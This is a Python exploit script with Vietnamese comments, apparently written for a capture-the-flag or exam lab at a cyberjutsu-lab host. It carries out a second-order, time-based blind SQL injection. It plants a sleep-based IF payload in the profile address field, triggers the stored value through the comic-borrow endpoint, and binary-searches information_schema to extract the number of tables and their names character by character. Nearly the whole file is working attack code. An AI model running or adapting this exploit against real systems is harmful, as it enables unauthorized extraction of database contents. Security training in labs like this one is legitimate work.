import string
import time
import urllib.parse
import requests

# ==================== CONFIGURATION ====================
BASE_URL = "https://kobos-087f8634.exam.cyberjutsu-lab.tech/"
USERNAME = "nghiaqt"
PASSWORD = ""
# QUAN TRỌNG: Chọn một chapter_id ít có khả năng hết hàng
CHAPTER_ID_TO_BORROW = "2" 
SLEEP_TIME = 5 # Giảm thời gian chờ để tăng tốc độ một chút
# =======================================================

s = requests.Session()

def login():
    # ... (giữ nguyên hàm login) ...
    print("[*] Đang đăng nhập...")
    login_url = f"{BASE_URL}/api/login"
    credentials = {"username": USERNAME, "password": PASSWORD}
    try:
        r = s.post(login_url, json=credentials, timeout=10)
        r.raise_for_status()
        token = r.json().get("token")
        if not token:
            print("[-] Lỗi: Không tìm thấy token. Thoát.")
            exit(1)
        s.headers.update({"Authorization": f"Bearer {token}"})
        print("[+] Đăng nhập thành công.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Lỗi đăng nhập: {e}. Thoát.")
        exit(1)

def return_chapter():
    """Hàm dọn dẹp, trả lại chương truyện đã mượn."""
    return_url = f"{BASE_URL}/api/comics/return"
    # Dữ liệu trả sách có thể đơn giản, không cần feedback
    return_data = {
        "chapter_id": CHAPTER_ID_TO_BORROW,
        "feedback": "cleanup",
        "rating": 5,
        "platform_feedback": "automated cleanup"
    }
    try:
        s.post(return_url, json=return_data, timeout=10)
    except requests.exceptions.RequestException:
        # Bỏ qua lỗi ở bước này
        pass

def check_condition(sql_condition):
    """
    Gieo mầm, kích hoạt và dọn dẹp. Trả về True nếu có độ trễ.
    """
    # Payload SQL đúng
    payload = f"' OR IF(({sql_condition}), sleep({SLEEP_TIME}), 0), '1234567890') -- "
    
    print(f"\n[DEBUG] SQL: {sql_condition}")
    
    encoded_payload = urllib.parse.quote_plus(payload)
    
    # 1. Gieo mầm
    implant_url = f"{BASE_URL}/api/profile/info"
    implant_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    implant_data = f"address={encoded_payload}&telephone=12345&_method=PUT"
    
    try:
        s.post(implant_url, headers=implant_headers, data=implant_data, timeout=10)
    except requests.exceptions.RequestException:
        pass

    # 2. Kích hoạt và đo thời gian
    trigger_url = f"{BASE_URL}/api/comics/borrow"
    trigger_data = {"chapter_id": CHAPTER_ID_TO_BORROW}
    
    is_true = False
    start_time = time.time()
    try:
        s.post(trigger_url, json=trigger_data, timeout=SLEEP_TIME + 2)
    except requests.exceptions.Timeout:
        is_true = True
    except requests.exceptions.RequestException:
        pass
    end_time = time.time()

    if not is_true:
        is_true = (end_time - start_time) >= SLEEP_TIME
    
    # 3. DỌN DẸP!
    # Bất kể kết quả là gì, luôn cố gắng trả lại sách để reset trạng thái
    return_chapter()
    
    return is_true

# ... (các hàm extract_data và extract_string giữ nguyên) ...
# (Phần code còn lại giống hệt phiên bản trước)
def extract_data(query_template):
    """Trích xuất một giá trị duy nhất (ví dụ: số lượng, độ dài)"""
    # Dùng binary search để tăng tốc độ
    low = 1
    high = 100 # Giả định giới hạn trên
    mid = 0
    
    print(f"[?] Đang tìm giá trị (binary search)... ", end="")
    while low <= high:
        mid = (high + low) // 2
        if mid == 0: break
        
        # Thử nếu giá trị lớn hơn mid
        condition = query_template.format(f"> {mid}")
        if check_condition(condition):
            low = mid + 1
        else:
            high = mid - 1
            
    value = low
    print(f"Tìm thấy: {value}")
    return value


def extract_string(query_template, length):
    """Trích xuất một chuỗi ký tự với độ dài đã biết"""
    result = ""
    for i in range(1, length + 1):
        low = 32
        high = 126

        while low <= high:
            mid = (low + high) // 2
            condition = query_template.format(i=i, char_code=f"<= {mid}")
            if check_condition(condition):
                high = mid - 1
            else:
                low = mid + 1

        found_char_code = low

        if 32 <= found_char_code <= 126:
            result += chr(found_char_code)
        else:
            print(f"\n[-] Không tìm thấy ký tự ở vị trí {i}. Có thể nằm ngoài charset.")
            result += "?"

    print(f"\n[!] Chuỗi đã trích xuất: {result}")
    return result
if __name__ == "__main__":
    login()

    # Bước đầu tiên, hãy đảm bảo trạng thái mượn là sạch sẽ
    print("[*] Đang thực hiện dọn dẹp ban đầu...")
    return_chapter()
    print("[+] Dọn dẹp hoàn tất.")
    
    print("\n--- Giai đoạn 1: Lấy số lượng bảng trong database ---")
    # ✅ Đếm số bảng — Đặt biểu thức trong dấu ngoặc
    num_tables_query = "(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database()) {}"
    table_count = extract_data(num_tables_query)
    
    if table_count is None or table_count == 0:
        print("[-] Không thể xác định số lượng bảng. Dừng lại.")
        exit(1)

    all_table_names = []
    print(f"\n--- Giai đoạn 2: Trích xuất tên của {table_count} bảng ---")
    for i in range(table_count):
        print(f"\n[+] Đang xử lý bảng thứ {i+1}/{table_count}...")
        
        # ✅ Lấy độ dài tên bảng — bao toàn bộ SELECT trong ngoặc
        len_query = f"(SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1) {{}}"
        table_name_length = extract_data(len_query)

        if table_name_length is None or table_name_length == 0:
            print(f"[-] Không thể lấy độ dài tên bảng thứ {i+1}. Bỏ qua.")
            continue
            
        # ✅ Lấy từng ký tự — đặt SELECT ASCII(...) trong dấu ngoặc
        str_query = "(SELECT ASCII(SUBSTRING(table_name, {i}, 1)) FROM information_schema.tables WHERE table_schema=database() LIMIT " + str(i) + ",1) {char_code}"
        table_name = extract_string(str_query, table_name_length)
        all_table_names.append(table_name)

    print("\n=================== KẾT QUẢ CUỐI CÙNG ===================")
    print("Các bảng có trong cơ sở dữ liệu là:")
    for name in all_table_names:
        print(f"- {name}")
    print("==========================================================")
